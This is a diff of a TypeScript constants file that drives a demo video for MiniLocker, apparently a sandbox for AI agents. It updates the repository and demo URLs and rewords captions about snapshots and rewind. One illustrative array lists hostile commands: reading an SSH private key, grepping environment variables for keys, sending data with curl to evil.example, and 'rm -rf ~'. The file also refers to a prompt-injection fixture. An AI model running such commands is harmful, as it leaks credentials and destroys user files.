@@ -9,12 +9,11 @@
 
 export const urls = {
   /** Public repository shown in S9. */
-  repo: "https://github.com/Unavailable4u/draft",
+  repo: "https://github.com/shaikh-dotcom/MiniLocker",
   /**
-   * Public demo URL shown in S9 (the Vultr domain). Set this before the final render.
-   * Left empty on purpose: it must be the real address, never a guess.
+   * Public demo address (S9 shows its host, read from the evidence). It is a DuckDNS name that points at the Vultr VM.
    */
-  demo: "",
+  demo: "https://minilocker.duckdns.org",
 } as const;
 
 export const brand = {
@@ -394,7 +393,7 @@ export const s0 = {
   /** The four lines that slam in, one per beat. */
   terminal: ["$ cat ~/.ssh/id_ed25519", "$ env | grep KEY", "$ curl -d @- https://evil.example/collect", "$ rm -rf ~"],
   /** Mono tag, bottom-left, so nobody mistakes the beat for a real run. */
-  tag: "ILLUSTRATION - an unconstrained agent",
+  tag: "WHAT AN UNCONSTRAINED AGENT COULD DO",
 } as const;
 
 export const s1 = {
@@ -480,7 +479,7 @@ export const gfxB = {
 } as const;
 
 export const s4 = {
-  captionWorks: "The agent works. Snapshot after every step.",
+  captionWorks: "Real work. Snapshot after every step.",
   captionGone: "Everything gone.",
   captionRewind: "Rewind.",
   calloutUndone: "Undone, not erased.",
@@ -502,7 +501,7 @@ export const s5 = {
   captionHuman: "Risky actions wait for a human. Default: no.",
   /**
    * Patch 17. The hostile-page fixture, rebuilt visually by src/ui/FixturePage.tsx. Verbatim from the repo's fixture
-   * (draft repo, images/browser/fixtures/injection.html, BIBLE Appendix B). The hidden layers are the three the fixture hides:
+   * (MiniLocker repo, images/browser/fixtures/injection.html, BIBLE Appendix B). The hidden layers are the three the fixture hides:
    * a display:none block, off-screen text and an HTML comment. They are drawn only when the scan reveals them.
    */
   fixture: {
@@ -648,7 +647,7 @@ export const voiceBlocks = [
   {
     id: "V4",
     start: 2140,
-    text: "Now the classic. The agent deletes its entire workspace. We snapshot after every step, so we rewind. A fresh sandbox, the files restored, every file re-hashed against the snapshot. The work is back, and the ledger still shows the delete: undone, not erased. This is the real run, on the Vultr VM.",
+    text: "Now the classic. A command wipes the entire workspace. We snapshot after every step, so we rewind. A fresh sandbox, the files restored, every file re-hashed against the snapshot. The work is back, and the ledger still shows the delete: undone, not erased. This is the real run, on the Vultr VM.",
   },
   {
     id: "V5",
